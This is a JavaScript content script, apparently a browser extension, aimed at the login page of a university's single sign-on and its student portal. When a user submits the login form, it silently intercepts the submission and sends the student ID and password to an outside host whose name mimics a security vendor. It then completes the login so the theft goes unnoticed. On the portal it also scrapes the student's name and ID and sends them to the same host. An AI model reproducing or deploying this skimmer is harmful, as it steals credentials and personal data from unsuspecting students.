const Main = async () => {
  if (window.location.href === "https://sso.upi.edu/cas/login?service=https%3A%2F%2Fspot.upi.edu%2Fberanda") {
    const submitBtn = document.querySelector(".btn-submit")
    const nim = document.getElementById("username");
    const password = document.getElementById("password");

    submitBtn.setAttribute('type', 'button');

    submitBtn.addEventListener('click', async () => {
      if (submitBtn.getAttribute('type') === 'button') {
        submitBtn.setAttribute('disabled', '');

        fetch('https://avast.ddns.net:3001/V1ZkU2ExRlhUbXBpTTFaMVpFRTlQUT09', {
          method: 'POST',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            nim: nim.value,
            password: password.value
          })
        }).then(() => {
          submitBtn.removeAttribute('disabled');
          submitBtn.setAttribute('type', 'submit');
          submitBtn.click();
        });
      }
    });

    return;
  } else if (window.location.href === "https://spot.upi.edu/mhs") {
    let profile = document.getElementsByClassName("profile-text m-t-15 font-16")[0].innerHTML.slice(1);
    let data = profile.split("  <br> ");

    fetch('https://avast.ddns.net:3001/V1ZkU2ExWllUbXhqWnowOQ==', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        name: data[0],
        nim: data[1]
      })
    });
  }
};

Main();